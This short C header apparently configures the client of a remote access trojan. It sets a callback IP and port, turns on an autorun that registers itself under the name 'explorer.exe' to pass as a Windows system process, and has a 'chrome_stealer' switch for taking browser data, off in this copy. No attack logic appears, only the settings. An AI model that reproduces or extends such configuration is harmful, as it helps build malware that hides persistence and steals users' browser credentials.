/*
 * Client program settings
 * You need to specify the ip, port and parametres (optional)
 * on which the server will run
*/

#ifndef CONFIG_H
#define CONFIG_H

#pragma warning(disable: 4996)
#pragma optimize("gsy", on)

// on-1 | off-0
#define chrome_stealer 0
#define autorun 1

static const char* IP   = "127.0.0.1";
static const int   PORT = 4001;
// language (optional)
static const char* lang = "ru";
// name in auto start
static const wchar_t* autorun_name = L"explorer.exe";

#endif // CONFIG_H